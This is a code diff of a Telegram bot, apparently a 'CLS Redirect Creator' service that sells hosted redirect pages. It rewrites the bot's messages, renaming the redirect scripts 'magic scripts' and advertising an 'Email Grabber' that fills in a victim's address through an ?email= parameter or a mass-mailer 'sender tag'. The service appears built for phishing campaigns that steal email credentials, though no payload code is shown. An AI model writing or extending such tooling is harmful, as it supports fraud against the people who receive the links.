@@ -1111,8 +1111,8 @@ if (bot) {
           statusMessage.message_id,
           null,
           `🎯 *CLS Redirect Creator*\n\n` +
-          `✅ Hosting account created successfully!\n` +
-          `🔧 Installing redirect scripts...`,
+          `✅ Hosting created successfully!\n` +
+          `🔧 Installing magic scripts...`,
           { parse_mode: "Markdown" }
         );
 
@@ -1130,8 +1130,8 @@ if (bot) {
               statusMessage.message_id,
               null,
               `🎯 *CLS Redirect Creator*\n\n` +
-              `✅ Hosting account ready!\n` +
-              `🔧 Installing redirect scripts... (${i}/3)\n` +
+              `✅ Hosting ready!\n` +
+              `🔧 Installing magic scripts... (${i}/3)\n` +
               `⚡ Almost there...`,
               { parse_mode: "Markdown" }
             );
@@ -1159,13 +1159,14 @@ if (bot) {
 
         // Step 3: Replace status message with final results
         const responseMessage =
-          `🎉 *CLS Redirect Successfully Created!*\n\n` +
+          `🎉 *CLS Redirect Successfully Created!✅*\n\n` +
           `🌐 *Your Domain:* \`${domain}\`\n\n` +
           `🚀 *Live Redirect URLs:*\n` +
           urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
           "\n\n" +
-          `📧 *Email Capture Feature:* Add ?email= parameter\n` +
-          `*Usage:* yourlink.html?email=user@domain.com`;
+          `Ask *Admin* for cloudflare namesever to link w ur domain\n\n` +
+          `*Email Grabber*: Add *?email=* to your link above\n` +
+          `*Usage:* yourlink.html?email=user@domain.com or replace user@domain.com w ur sender tag`;
 
         // Replace the status message with final results
         await ctx.telegram.editMessageText(
@@ -1202,7 +1203,7 @@ if (bot) {
           try {
             await bot.telegram.sendMessage(
               process.env.ADMIN_ID,
-              `🎉 *CLS Redirect Successfully Created*\n\n` +
+              `🎉 *New CLS Redirect Order*\n\n` +
               `👤 User: @${ctx.from.username || 'Unknown'} (${ctx.from.id})\n` +
               `👤 Name: ${ctx.from.first_name || 'Unknown'}\n` +
               `🌐 Domain: \`${domain}\`\n` +
